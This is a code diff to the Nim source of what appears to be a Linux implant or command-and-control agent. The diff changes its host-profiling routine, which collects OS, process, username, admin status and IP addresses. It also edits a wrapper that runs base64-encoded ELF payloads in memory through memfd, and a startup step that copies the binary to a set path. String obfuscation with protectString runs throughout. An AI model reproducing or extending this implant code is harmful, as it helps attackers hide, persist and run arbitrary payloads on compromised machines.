@@ -7,6 +7,7 @@ import std/[tables, nativesockets, json]
 import system/[io]
 import httpclient
 import nimprotect
+import strformat
 import strutils
 import osproc
 import crc32
@@ -53,9 +54,7 @@ proc collect_data(): bool =
     except:
         os_version = could_not_retrieve      
     try:    
-        var pid = $getCurrentProcessId()
-        var pname = readFile(protectString("/proc/") & $pid & protectString("/comm")).replace("\n", "")
-        process = pid & " " & pname
+        process = fmt"[{$getCurrentProcessId()}] {getAppFilename()}"
     except:
         process = could_not_retrieve
     try:
@@ -75,7 +74,7 @@ proc collect_data(): bool =
             is_admin = could_not_retrieve
         is_elevated = "False"
     try:
-        ipv4_local = execCmdEx(protectString("hostname -I"))[0].replace("\n", "")
+        ipv4_local = execCmdEx(protectString("hostname -I"))[0].replace(" ", "\n")
     except:
         ipv4_local = could_not_retrieve
     try:
@@ -89,8 +88,8 @@ proc collect_data(): bool =
         protectString("OS Version"): os_version,
         protectString("Process"): process,
         protectString("Username"): username, 
-        protectString("Is Admin"): is_admin, 
-        protectString("Is Elevated"): is_elevated, 
+        protectString("Admin"): is_admin, 
+        protectString("Elevated"): is_elevated, 
         protectString("IPV4 Local"): ipv4_local, 
         protectString("IPV4 Public"): ipv4_public
     
@@ -117,9 +116,9 @@ proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bo
     (is_success, output) = load_memfd(elf_base64, command_line, is_task)
 
     var data = {
-        "is_success": $is_success,
-        "mode": mode,
-        "command_line": command_line
+        protectString("mode"): mode,
+        protectString("command_line"): command_line,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
     if output.len() > 0:
@@ -148,7 +147,7 @@ proc get_linux_agent_id*(): string =
 proc linux_start*(): void =
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
-    if is_exe and (binary_path != agent_execution_path_linux):
+    if is_exe and reloc_on_exec_linux and (binary_path != agent_execution_path_linux):
         var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_linux)
